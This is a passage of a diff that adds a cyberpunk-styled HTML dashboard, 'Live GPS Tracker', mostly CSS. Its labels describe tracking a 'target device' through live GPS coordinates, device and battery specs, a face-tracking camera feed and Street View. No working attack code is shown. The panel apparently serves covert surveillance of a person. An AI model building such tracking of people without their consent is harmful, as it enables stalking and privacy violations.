@@ -1,0 +1,2193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Live GPS Tracker // Google Geo Recon & Tactical Intelligence</title>
+
+  <!-- Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Rajdhani:wght@500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+
+  <!-- Leaflet CSS -->
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+
+  <style>
+    /* ==========================================================================
+       RESET & BASE THEME (CYBERPUNK RECON + GOOGLE GEO INTEGRATION)
+       ========================================================================== */
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    :root {
+      --bg-dark: #0a0a0f;
+      --panel-bg: rgba(14, 18, 28, 0.92);
+      --panel-border: rgba(0, 240, 255, 0.32);
+      --cyan-accent: #00f0ff;
+      --cyan-glow: rgba(0, 240, 255, 0.5);
+      --neon-green: #39ff14;
+      --neon-green-glow: rgba(57, 255, 20, 0.5);
+      --neon-red: #ff3366;
+      --neon-yellow: #ffd700;
+      --neon-orange: #ff8800;
+      --text-primary: #e0f8ff;
+      --text-secondary: #7e9bb0;
+      --font-display: 'Orbitron', 'Segoe UI', monospace;
+      --font-ui: 'Rajdhani', -apple-system, sans-serif;
+      --font-mono: 'JetBrains Mono', 'Courier New', monospace;
+    }
+
+    html, body {
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      background-color: var(--bg-dark);
+      color: var(--text-primary);
+      font-family: var(--font-ui);
+      user-select: none;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* Full-screen Leaflet Map container with 3D Orbit transition */
+    #map {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      z-index: 1;
+      background-color: var(--bg-dark);
+      transition: transform 1.2s cubic-bezier(0.2, 0.8, 0.2, 1);
+      transform-origin: center center;
+    }
+
+    #map.orbit-3d {
+      transform: perspective(950px) rotateX(22deg) scale(1.05);
+    }
+
+    /* Dark Mode Tile Filter */
+    .dark-tiles {
+      filter: invert(100%) hue-rotate(180deg) brightness(88%) contrast(92%);
+    }
+
+    /* Subtle CRT / Cyberpunk Grid scanlines overlay */
+    .cyber-scanlines {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 2;
+      background: linear-gradient(
+        to bottom,
+        rgba(255, 255, 255, 0),
+        rgba(255, 255, 255, 0) 50%,
+        rgba(0, 0, 0, 0.2) 50%,
+        rgba(0, 0, 0, 0.2)
+      );
+      background-size: 100% 4px;
+      opacity: 0.45;
+    }
+
+    /* Screen corner tech decorations */
+    .corner-bracket {
+      position: fixed;
+      width: 24px;
+      height: 24px;
+      pointer-events: none;
+      z-index: 99;
+      border-color: var(--cyan-accent);
+      opacity: 0.6;
+    }
+    .corner-tl { top: 12px; left: 12px; border-top: 2px solid; border-left: 2px solid; }
+    .corner-tr { top: 12px; right: 12px; border-top: 2px solid; border-right: 2px solid; }
+    .corner-bl { bottom: 12px; left: 12px; border-bottom: 2px solid; border-left: 2px solid; }
+    .corner-br { bottom: 12px; right: 12px; border-bottom: 2px solid; border-right: 2px solid; }
+
+    /* ==========================================================================
+       TOP-LEFT HUD OVERLAY PANEL (TELEMETRY MISSION CONTROL)
+       ========================================================================== */
+    .hud-panel {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      z-index: 10;
+      width: 350px;
+      max-width: calc(100vw - 40px);
+      max-height: calc(100vh - 40px);
+      overflow-y: auto;
+      background: var(--panel-bg);
+      backdrop-filter: blur(14px);
+      -webkit-backdrop-filter: blur(14px);
+      border: 1px solid var(--panel-border);
+      border-radius: 8px;
+      padding: 14px 16px;
+      box-shadow: 0 10px 35px rgba(0, 0, 0, 0.7),
+                  0 0 25px rgba(0, 240, 255, 0.12),
+                  inset 0 0 15px rgba(0, 240, 255, 0.05);
+    }
+
+    .hud-panel::-webkit-scrollbar {
+      width: 4px;
+    }
+    .hud-panel::-webkit-scrollbar-thumb {
+      background: rgba(0, 240, 255, 0.3);
+      border-radius: 2px;
+    }
+
+    .hud-panel::before {
+      content: '';
+      position: absolute;
+      top: -1px;
+      left: 20px;
+      right: 20px;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, var(--cyan-accent), var(--neon-green), transparent);
+      box-shadow: 0 0 8px var(--cyan-accent);
+    }
+
+    .panel-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid rgba(0, 240, 255, 0.15);
+      padding-bottom: 8px;
+      margin-bottom: 10px;
+    }
+
+    .panel-tagline {
+      font-family: var(--font-mono);
+      font-size: 9.5px;
+      letter-spacing: 2px;
+      color: var(--cyan-accent);
+      text-transform: uppercase;
+      opacity: 0.85;
+    }
+
+    .panel-title {
+      font-family: var(--font-display);
+      font-size: 15px;
+      font-weight: 700;
+      letter-spacing: 1.5px;
+      color: #ffffff;
+      text-shadow: 0 0 10px var(--cyan-glow);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .status-badge {
+      display: flex;
+      align-items: center;
+      gap: 7px;
+      background: rgba(0, 0, 0, 0.5);
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      padding: 3px 8px;
+      border-radius: 20px;
+      font-family: var(--font-mono);
+      font-size: 10px;
+      font-weight: 700;
+      letter-spacing: 1px;
+    }
+
+    .status-dot {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background-color: var(--neon-yellow);
+      box-shadow: 0 0 8px var(--neon-yellow);
+      transition: background-color 0.3s, box-shadow 0.3s;
+      animation: pulse-dot 1.8s infinite;
+    }
+
+    .status-dot.connected {
+      background-color: var(--neon-green);
+      box-shadow: 0 0 10px var(--neon-green);
+    }
+
+    .status-dot.waiting {
+      background-color: var(--neon-yellow);
+      box-shadow: 0 0 10px var(--neon-yellow);
+    }
+
+    .status-dot.disconnected {
+      background-color: var(--neon-red);
+      box-shadow: 0 0 10px var(--neon-red);
+    }
+
+    @keyframes pulse-dot {
+      0%, 100% { transform: scale(1); opacity: 1; }
+      50% { transform: scale(1.35); opacity: 0.6; }
+    }
+
+    /* Telemetry Metrics Grid */
+    .telemetry-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 7px;
+      margin-bottom: 12px;
+    }
+
+    .metric-card {
+      background: rgba(8, 12, 22, 0.65);
+      border: 1px solid rgba(0, 240, 255, 0.14);
+      border-radius: 5px;
+      padding: 6px 8px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .metric-card.full-width {
+      grid-column: span 2;
+    }
+
+    .metric-label {
+      font-family: var(--font-mono);
+      font-size: 9px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      color: var(--text-secondary);
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      margin-bottom: 2px;
+    }
+
+    .metric-label svg {
+      width: 11px;
+      height: 11px;
+      stroke: var(--cyan-accent);
+      fill: none;
+    }
+
+    .metric-value {
+      font-family: var(--font-mono);
+      font-size: 13px;
+      font-weight: 700;
+      color: var(--text-primary);
+      letter-spacing: 0.5px;
+      white-space: nowrap;
+    }
+
+    .metric-value.highlight-cyan {
+      color: var(--cyan-accent);
+      text-shadow: 0 0 8px var(--cyan-glow);
+    }
+
+    .metric-value.highlight-green {
+      color: var(--neon-green);
+      text-shadow: 0 0 8px var(--neon-green-glow);
+    }
+
+    .metric-sub {
+      font-size: 9.5px;
+      color: var(--text-secondary);
+      font-weight: 500;
+      margin-left: 3px;
+    }
+
+    /* Buttons Row */
+    .controls-row {
+      display: flex;
+      gap: 5px;
+      margin-bottom: 7px;
+    }
+
+    .hud-btn {
+      flex: 1;
+      background: rgba(0, 240, 255, 0.08);
+      border: 1px solid var(--cyan-accent);
+      color: var(--cyan-accent);
+      padding: 6px 8px;
+      border-radius: 4px;
+      font-family: var(--font-display);
+      font-size: 9.5px;
+      font-weight: 700;
+      letter-spacing: 0.8px;
+      text-transform: uppercase;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 4px;
+      transition: all 0.25s ease;
+      outline: none;
+    }
+
+    .hud-btn:hover {
+      background: rgba(0, 240, 255, 0.22);
+      box-shadow: 0 0 12px var(--cyan-glow);
+      transform: translateY(-1px);
+    }
+
+    .hud-btn:active {
+      transform: translateY(1px);
+    }
+
+    .hud-btn.active {
+      background: rgba(0, 240, 255, 0.28);
+      border-color: #ffffff;
+      color: #ffffff;
+      box-shadow: 0 0 12px var(--cyan-accent);
+    }
+
+    .hud-btn.btn-orbit.active {
+      background: rgba(57, 255, 20, 0.25);
+      border-color: var(--neon-green);
+      color: var(--neon-green);
+      box-shadow: 0 0 15px rgba(57, 255, 20, 0.45);
+    }
+
+    .hud-btn.btn-danger {
+      border-color: rgba(255, 51, 102, 0.6);
+      color: #ff5e82;
+      background: rgba(255, 51, 102, 0.08);
+    }
+
+    .hud-btn.btn-danger:hover {
+      border-color: var(--neon-red);
+      background: rgba(255, 51, 102, 0.24);
+      box-shadow: 0 0 12px rgba(255, 51, 102, 0.4);
+    }
+
+    .hud-btn svg {
+      width: 11px;
+      height: 11px;
+      stroke: currentColor;
+      fill: none;
+    }
+
+    /* ==========================================================================
+       TARGET DEVICE & NETWORK SPECS HUD CARD
+       ========================================================================== */
+    .device-intel-card {
+      background: rgba(8, 14, 26, 0.85);
+      border: 1px solid rgba(0, 240, 255, 0.22);
+      border-radius: 6px;
+      padding: 9px 11px;
+      margin-top: 10px;
+    }
+
+    .intel-header {
+      font-family: var(--font-mono);
+      font-size: 9.5px;
+      font-weight: 700;
+      color: var(--cyan-accent);
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid rgba(0, 240, 255, 0.12);
+      padding-bottom: 5px;
+      margin-bottom: 7px;
+    }
+
+    .intel-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 5px;
+      font-size: 11px;
+      font-family: var(--font-mono);
+    }
+
+    .intel-item {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .intel-item.full-width {
+      grid-column: span 2;
+    }
+
+    .intel-k {
+      font-size: 8.5px;
+      color: var(--text-secondary);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .intel-v {
+      color: #fff;
+      font-weight: 600;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .badge-5g {
+      display: inline-block;
+      background: #00f0ff;
+      color: #000;
+      font-weight: 800;
+      padding: 1px 5px;
+      border-radius: 3px;
+      font-size: 9px;
+    }
+
+    .badge-batt {
+      color: var(--neon-green);
+    }
+
+    /* ==========================================================================
+       AUTHENTIC GOOGLE MAPS PLACE CARD (TOP-RIGHT)
+       ========================================================================== */
+    .gmaps-card {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      z-index: 10;
+      width: 370px;
+      max-width: calc(100vw - 40px);
+      background: #ffffff;
+      color: #202124;
+      border-radius: 12px;
+      box-shadow: 0 12px 35px rgba(0, 0, 0, 0.6), 0 2px 8px rgba(0, 0, 0, 0.18);
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      overflow: hidden;
+      transition: all 0.3s cubic-bezier(0.2, 0.8, 0.2, 1);
+    }
+
+    .gmaps-card.collapsed .gmaps-body {
+      display: none;
+    }
+
+    .gmaps-header {
+      background: #ffffff;
+      border-bottom: 1px solid #e8eaed;
+      padding: 10px 14px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .gmaps-logo {
+      display: flex;
+      align-items: center;
+      gap: 7px;
+    }
+
+    .gmaps-pin-icon {
+      width: 22px;
+      height: 22px;
+    }
+
+    .gmaps-brand {
+      font-weight: 700;
+      font-size: 15px;
+      color: #202124;
+      letter-spacing: -0.2px;
+    }
+
+    .gmaps-badge {
+      background: #e6f4ea;
+      color: #137333;
+      font-size: 9.5px;
+      font-weight: 700;
+      padding: 2px 7px;
+      border-radius: 12px;
+      letter-spacing: 0.5px;
+    }
+
+    .gmaps-toggle-btn {
+      background: none;
+      border: none;
+      color: #70757a;
+      font-size: 13px;
+      cursor: pointer;
+      padding: 4px 6px;
+      border-radius: 4px;
+    }
+
+    .gmaps-body {
+      padding: 12px 14px;
+      max-height: calc(100vh - 280px);
+      overflow-y: auto;
+    }
+
+    .gmaps-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: #202124;
+      line-height: 1.3;
+      margin-bottom: 3px;
+    }
+
+    .gmaps-category {
+      font-size: 11px;
+      color: #70757a;
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .gmaps-stars {
+      color: #e37400;
+      font-weight: 700;
+    }
+
+    .gmaps-address {
+      font-size: 12px;
+      line-height: 1.45;
+      color: #3c4043;
+      background: #f8f9fa;
+      padding: 7px 10px;
+      border-radius: 7px;
+      border-left: 3px solid #1a73e8;
+      margin-bottom: 10px;
+      word-break: break-word;
+    }
+
+    .gmaps-details-table {
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+      font-size: 11px;
+      margin-bottom: 12px;
+      border-top: 1px solid #f1f3f4;
+      padding-top: 8px;
+    }
+
+    .gmaps-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 2px 0;
+    }
+
+    .gmaps-row .k {
+      color: #70757a;
+      font-weight: 500;
+    }
+
+    .gmaps-row .v {
+      color: #202124;
+      font-weight: 600;
+      text-align: right;
+      max-width: 65%;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+    .gmaps-actions {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 6px;
+    }
+
+    .gmaps-act-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 5px;
+      padding: 7px 9px;
+      border-radius: 20px;
+      font-size: 11px;
+      font-weight: 600;
+      text-decoration: none;
+      border: 1px solid #dadce0;
+      background: #ffffff;
+      color: #1a73e8;
+      cursor: pointer;
+      transition: background 0.15s, box-shadow 0.15s;
+    }
+
+    .gmaps-act-btn:hover {
+      background: #f8fafd;
+      border-color: #d2e3fc;
+      box-shadow: 0 1px 4px rgba(60,64,67,0.18);
+    }
+
+    .gmaps-act-btn svg {
+      width: 13px;
+      height: 13px;
+    }
+
+    .gmaps-act-btn.primary {
+      background: #1a73e8;
+      color: #ffffff;
+      border: none;
+      grid-column: span 2;
+    }
+
+    .gmaps-act-btn.primary:hover {
+      background: #1765cc;
+    }
+
+    /* ==========================================================================
+       NEARBY POI DRAWER (PETROL BUNKS & SHOPS)
+       ========================================================================== */
+    .poi-drawer {
+      margin-top: 12px;
+      border-top: 1px solid #e8eaed;
+      padding-top: 10px;
+    }
+
+    .poi-drawer-title {
+      font-size: 11.5px;
+      font-weight: 700;
+      color: #202124;
+      letter-spacing: 0.5px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 6px;
+    }
+
+    .poi-count-chip {
+      background: #e8f0fe;
+      color: #1a73e8;
+      font-size: 9.5px;
+      font-weight: 700;
+      padding: 1px 6px;
+      border-radius: 10px;
+    }
+
+    .poi-list {
+      display: flex;
+      flex-direction: column;
+      gap: 5px;
+      max-height: 140px;
+      overflow-y: auto;
+    }
+
+    .poi-item {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: #f8f9fa;
+      border: 1px solid #e8eaed;
+      border-radius: 6px;
+      padding: 5px 8px;
+      font-size: 11px;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+
+    .poi-item:hover {
+      background: #e8f0fe;
+      border-color: #d2e3fc;
+    }
+
+    .poi-info {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      max-width: 75%;
+    }
+
+    .poi-icon {
+      font-size: 14px;
+    }
+
+    .poi-name {
+      font-weight: 600;
+      color: #202124;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .poi-dist {
+      color: #137333;
+      font-weight: 700;
+      font-size: 10.5px;
+      white-space: nowrap;
+    }
+
+    /* ==========================================================================
+       LIVE DUAL CAMERA & VIDEO HUD (BOTTOM-RIGHT)
+       ========================================================================== */
+    .face-track-panel {
+      position: absolute;
+      bottom: 20px;
+      right: 20px;
+      z-index: 10;
+      width: 290px;
+      background: rgba(10, 15, 28, 0.94);
+      backdrop-filter: blur(14px);
+      border: 1px solid rgba(0, 240, 255, 0.45);
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7), 0 0 15px rgba(0, 240, 255, 0.2);
+      transition: all 0.3s ease;
+    }
+
+    .face-track-panel.minimized .face-feed-container,
+    .face-track-panel.minimized .face-telemetry-bar,
+    .face-track-panel.minimized .camera-mode-bar {
+      display: none;
+    }
+
+    .face-track-header {
+      background: rgba(0, 240, 255, 0.12);
+      padding: 8px 12px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid rgba(0, 240, 255, 0.2);
+      font-family: var(--font-mono);
+      font-size: 9.5px;
+      letter-spacing: 1px;
+      color: var(--cyan-accent);
+    }
+
+    .face-status-indicator {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .face-dot {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background: #39ff14;
+      box-shadow: 0 0 8px #39ff14;
+      animation: pulse-dot 1.2s infinite;
+    }
+
+    .camera-mode-bar {
+      display: flex;
+      background: rgba(4, 8, 16, 0.8);
+      border-bottom: 1px solid rgba(0, 240, 255, 0.15);
+      padding: 4px 6px;
+      gap: 4px;
+    }
+
+    .cam-mode-btn {
+      flex: 1;
+      background: none;
+      border: 1px solid rgba(0, 240, 255, 0.25);
+      border-radius: 3px;
+      color: var(--text-secondary);
+      font-family: var(--font-mono);
+      font-size: 9px;
+      font-weight: 700;
+      padding: 3px 0;
+      cursor: pointer;
+      text-transform: uppercase;
+      transition: all 0.15s;
+    }
+
+    .cam-mode-btn.active {
+      background: rgba(0, 240, 255, 0.25);
+      color: #00f0ff;
+      border-color: #00f0ff;
+    }
+
+    .face-feed-container {
+      position: relative;
+      width: 100%;
+      height: 200px;
+      background: #030408;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+
+    .face-feed-img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+
+    .face-scanner-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+    }
+
+    .scan-line {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, #00f0ff, transparent);
+      box-shadow: 0 0 8px #00f0ff;
+      animation: scan-vertical 2.2s ease-in-out infinite;
+    }
+
+    @keyframes scan-vertical {
+      0% { top: 0%; opacity: 0.8; }
+      50% { top: 96%; opacity: 0.8; }
+      100% { top: 0%; opacity: 0.8; }
+    }
+
+    .target-face-box {
+      position: absolute;
+      top: 20%;
+      left: 20%;
+      width: 60%;
+      height: 60%;
+      border: 1px dashed rgba(0, 240, 255, 0.6);
+      box-shadow: inset 0 0 10px rgba(0, 240, 255, 0.15);
+    }
+
+    .corner {
+      position: absolute;
+      width: 10px;
+      height: 10px;
+      border-color: #39ff14;
+    }
+    .c-tl { top: -2px; left: -2px; border-top: 2px solid; border-left: 2px solid; }
+    .c-tr { top: -2px; right: -2px; border-top: 2px solid; border-right: 2px solid; }
+    .c-bl { bottom: -2px; left: -2px; border-bottom: 2px solid; border-left: 2px solid; }
+    .c-br { bottom: -2px; right: -2px; border-bottom: 2px solid; border-right: 2px solid; }
+
+    .target-label {
+      position: absolute;
+      bottom: -18px;
+      left: 0;
+      width: 100%;
+      text-align: center;
+      font-family: var(--font-mono);
+      font-size: 8.5px;
+      color: #39ff14;
+      letter-spacing: 1px;
+      text-shadow: 0 0 6px #39ff14;
+    }
+
+    .face-standby {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .face-wireframe-svg {
+      width: 70px;
+      height: 70px;
+      opacity: 0.7;
+      animation: pulse-blip 2s infinite;
+    }
+
+    .face-standby-text {
+      font-family: var(--font-mono);
+      font-size: 9.5px;
+      letter-spacing: 1px;
+      color: var(--cyan-accent);
+      text-align: center;
+    }
+
+    .face-telemetry-bar {
+      padding: 6px 10px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: rgba(0, 0, 0, 0.65);
+      border-top: 1px solid rgba(0, 240, 255, 0.15);
+      font-family: var(--font-mono);
+      font-size: 9px;
+    }
+
+    .face-stat {
+      color: var(--text-secondary);
+    }
+
+    .face-snap-btn {
+      background: rgba(0, 240, 255, 0.15);
+      border: 1px solid var(--cyan-accent);
+      color: var(--cyan-accent);
+      padding: 2px 7px;
+      border-radius: 4px;
+      font-size: 9px;
+      cursor: pointer;
+      font-family: var(--font-mono);
+    }
+
+    .face-snap-btn:hover {
+      background: var(--cyan-accent);
+      color: #000;
+    }
+
+    /* ==========================================================================
+       STREET VIEW 360° INTERACTIVE MODAL
+       ========================================================================== */
+    .streetview-modal {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%) scale(0.95);
+      width: 780px;
+      max-width: 92vw;
+      height: 520px;
+      max-height: 85vh;
+      background: #0d111c;
+      border: 2px solid var(--cyan-accent);
+      border-radius: 10px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.9), 0 0 30px rgba(0, 240, 255, 0.35);
+      z-index: 100;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+      opacity: 0;
+      pointer-events: none;
+      transition: all 0.3s cubic-bezier(0.2, 0.8, 0.2, 1);
+    }
+
+    .streetview-modal.open {
+      opacity: 1;
+      pointer-events: auto;
+      transform: translate(-50%, -50%) scale(1);
+    }
+
+    .streetview-header {
+      background: #111827;
+      padding: 10px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid rgba(0, 240, 255, 0.3);
+      font-family: var(--font-display);
+      font-size: 13px;
+      color: #fff;
+      letter-spacing: 1px;
+    }
+
+    .streetview-close-btn {
+      background: none;
+      border: none;
+      color: #ff3366;
+      font-size: 18px;
+      cursor: pointer;
+      padding: 0 4px;
+    }
+
+    .streetview-body {
+      flex: 1;
+      width: 100%;
+      height: 100%;
+      background: #000;
+      position: relative;
+    }
+
+    .streetview-iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
+
+    /* Target Pins & Markers */
+    .gmaps-marker-container {
+      position: relative;
+      width: 36px;
+      height: 50px;
+    }
+
+    .gmaps-pin-svg {
+      width: 36px;
+      height: 50px;
+      display: block;
+      filter: drop-shadow(0 4px 10px rgba(0,0,0,0.6));
+      animation: bounce-pin 1.2s ease-out;
+    }
+
+    @keyframes bounce-pin {
+      0% { transform: translateY(-30px); opacity: 0; }
+      60% { transform: translateY(4px); opacity: 1; }
+      80% { transform: translateY(-6px); }
+      100% { transform: translateY(0); }
+    }
+
+    .marker-orbit-ring {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 90px;
+      height: 90px;
+      margin-top: -45px;
+      margin-left: -45px;
+      border-radius: 50%;
+      border: 1.5px dashed rgba(0, 240, 255, 0.7);
+      animation: spin-orbit 8s linear infinite;
+      pointer-events: none;
+    }
+
+    .marker-target-reticle {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 60px;
+      height: 60px;
+      margin-top: -30px;
+      margin-left: -30px;
+      border-radius: 50%;
+      border: 1px solid rgba(57, 255, 20, 0.65);
+      animation: pulse-reticle 2s ease-in-out infinite;
+      pointer-events: none;
+    }
+
+    @keyframes spin-orbit {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+
+    @keyframes pulse-reticle {
+      0%, 100% { transform: scale(0.9); opacity: 0.5; }
+      50% { transform: scale(1.15); opacity: 0.9; }
+    }
+
+    .marker-heading-indicator {
+      position: absolute;
+      top: -12px;
+      left: 50%;
+      transform-origin: 50% 36px;
+      width: 0;
+      height: 0;
+      border-left: 6px solid transparent;
+      border-right: 6px solid transparent;
+      border-bottom: 12px solid var(--neon-green);
+      filter: drop-shadow(0 0 6px var(--neon-green));
+      z-index: 2;
+      transition: transform 0.35s ease;
+      display: none;
+    }
+
+    /* Custom POI Map Pins */
+    .poi-map-pin {
+      background: #ffffff;
+      border: 2px solid #1a73e8;
+      border-radius: 50%;
+      width: 28px;
+      height: 28px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 14px;
+      box-shadow: 0 3px 8px rgba(0, 0, 0, 0.4);
+    }
+
+    .poi-map-pin.petrol {
+      border-color: #ea4335;
+      background: #fff8f8;
+    }
+
+    .poi-map-pin.shop {
+      border-color: #fbbc04;
+      background: #fffdf5;
+    }
+
+    /* CENTERED WAITING OVERLAY */
+    .waiting-overlay {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 15;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 28px 38px;
+      background: rgba(10, 14, 24, 0.92);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      border: 1px solid var(--cyan-accent);
+      border-radius: 8px;
+      box-shadow: 0 0 30px rgba(0, 240, 255, 0.25);
+      pointer-events: none;
+      transition: opacity 0.6s ease, transform 0.6s ease;
+      text-align: center;
+    }
+
+    .waiting-overlay.hidden {
+      opacity: 0;
+      transform: translate(-50%, -50%) scale(0.92);
+      visibility: hidden;
+    }
+
+    .radar-container {
+      position: relative;
+      width: 80px;
+      height: 80px;
+      margin-bottom: 16px;
+    }
+
+    .radar-circle {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+      border: 1px solid rgba(0, 240, 255, 0.35);
+    }
+
+    .radar-circle.inner {
+      top: 20%;
+      left: 20%;
+      width: 60%;
+      height: 60%;
+      border-style: dashed;
+      border-color: rgba(0, 240, 255, 0.2);
+    }
+
+    .radar-sweep {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+      background: conic-gradient(from 0deg, rgba(0, 240, 255, 0.45), transparent 60%);
+      animation: radar-spin 2.2s linear infinite;
+    }
+
+    .radar-center-blip {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 8px;
+      height: 8px;
+      background: var(--cyan-accent);
+      border-radius: 50%;
+      transform: translate(-50%, -50%);
+      box-shadow: 0 0 10px var(--cyan-accent);
+      animation: pulse-blip 1.5s ease-out infinite;
+    }
+
+    @keyframes radar-spin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+
+    @keyframes pulse-blip {
+      0% { transform: translate(-50%, -50%) scale(0.7); opacity: 0.6; }
+      50% { transform: translate(-50%, -50%) scale(1.3); opacity: 1; }
+      100% { transform: translate(-50%, -50%) scale(0.7); opacity: 0.6; }
+    }
+
+    .waiting-title {
+      font-family: var(--font-display);
+      font-size: 15px;
+      font-weight: 700;
+      letter-spacing: 2px;
+      color: #ffffff;
+      text-transform: uppercase;
+      margin-bottom: 6px;
+    }
+
+    .waiting-sub {
+      font-family: var(--font-mono);
+      font-size: 10px;
+      color: var(--cyan-accent);
+      letter-spacing: 1px;
+    }
+
+    /* Responsive */
+    @media (max-width: 768px) {
+      .hud-panel {
+        top: 10px;
+        left: 10px;
+        width: calc(100vw - 20px);
+      }
+      .gmaps-card {
+        top: auto;
+        bottom: 10px;
+        right: 10px;
+        width: calc(100vw - 20px);
+      }
+      .face-track-panel {
+        display: none;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Tech corner brackets -->
+  <div class="corner-bracket corner-tl"></div>
+  <div class="corner-bracket corner-tr"></div>
+  <div class="corner-bracket corner-bl"></div>
+  <div class="corner-bracket corner-br"></div>
+
+  <!-- CRT Scanlines overlay -->
+  <div class="cyber-scanlines"></div>
+
+  <!-- Full-screen Leaflet Map with 3D Orbit capabilities -->
+  <div id="map"></div>
+
+  <!-- TOP-LEFT CYBERPUNK MISSION CONTROL HUD PANEL -->
+  <div class="hud-panel" id="hudPanel">
+    <div class="panel-header">
+      <div class="title-group">
+        <span class="panel-tagline">Telemetry // GPS Recon</span>
+        <h1 class="panel-title">LIVE TRACKING</h1>
+      </div>
+      <div class="status-badge" id="statusBadge" title="Server Connection Status">
+        <div class="status-dot waiting" id="statusDot"></div>
+        <span id="statusText">WAITING</span>
+      </div>
+    </div>
+
+    <!-- Telemetry Data Cards -->
+    <div class="telemetry-grid">
+      <!-- Coordinates -->
+      <div class="metric-card full-width">
+        <div class="metric-label">
+          <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="2" x2="12" y2="6"/><line x1="12" y1="18" x2="12" y2="22"/><line x1="2" y1="12" x2="6" y2="12"/><line x1="18" y1="12" x2="22" y2="12"/></svg>
+          Coordinates (Lat, Lng)
+        </div>
+        <div class="metric-value highlight-cyan" id="valCoords">--.------, --.------</div>
+      </div>
+
+      <!-- Speed -->
+      <div class="metric-card">
+        <div class="metric-label">
